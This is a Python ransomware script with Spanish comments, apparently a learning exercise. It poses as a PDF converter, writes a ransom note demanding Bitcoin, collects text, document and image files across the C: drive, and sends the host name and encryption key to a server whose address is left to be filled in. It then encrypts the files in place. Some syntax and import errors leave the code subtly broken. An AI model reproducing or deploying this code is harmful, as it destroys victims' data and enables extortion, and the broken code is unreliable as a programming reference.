import os
import random
import socket
from fpdf import FPDF
import aspose.words as aw

#---------------------FUNCIONALIDAD "LEGITIMA"----------------------
#SAFEGUARD para no correr el programa por accidente = 'si'
safeguard = input('Desea convertir a PDF?("si" / otra tecla para no): \t')  
if safeguard != 'si':
	quit()

pdf = FPDF()
  
# Agregar pagina
pdf.add_page()
  
# estilo y tamaño de fuente 
pdf.set_font("Arial", size = 12)
  
# solicita nombre del archivo aunque realmente no hace nada
readInput = input("Inserte nombre del archivo: ")
# crea celda
pdf.cell(200, 10, txt = "¿QUÉ LE PASÓ A MI COMPUTADORA?", 
         ln = 1, align = 'C')
  
# crea otra celda
pdf.cell(200, 10, txt = "Ha sido víctima de ransomware, pague X dólares en BTC para liberar sus archivos",
         ln = 2, align = 'C')
# crea otra celda
pdf.cell(200, 10, txt = "la dirección de pago es: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
         ln = 2, align = 'C')
  
# Guarda archivo 
pdf.output("SALVARCOMPUTADORA.pdf") 
#--------------------------------------------------------------------

#Extensiones a cifrar
encrypted_ext = ('.txt','docx','png','jpg')

#Tomar archivos de la máquina
file_paths = []
for root, dirs, files in os.walk('C:\\'):
	for file in files:
		file_path, file_ext = os.path.splitext(root+'\\'+file)
		if file_ext in encrypted_ext:
			file_paths.append(root+'\\'+file)

#Generar llave
key = Fernet.generate_key()
with open("thekey.key","wb") sd thekey:
	thekey.write(key)

#nombre del host(victima)
hostname = os.getenv('COMPUTERNAME')

#Conectarse a servidor de ransomware para enviar nombre del host y llave
ip_address = '127.0.0.1' #CAMBIAR POR DIRECCIÓN DEL SERVIDOR AL QUE SE ENVIA
port = 3141
ttime = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.connect((ip_address, port))
	s.send(f'[{time}] - {hostname}: {key}'.encode('utf-8'))
	
#Cifrar archivos
for file in file_paths:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
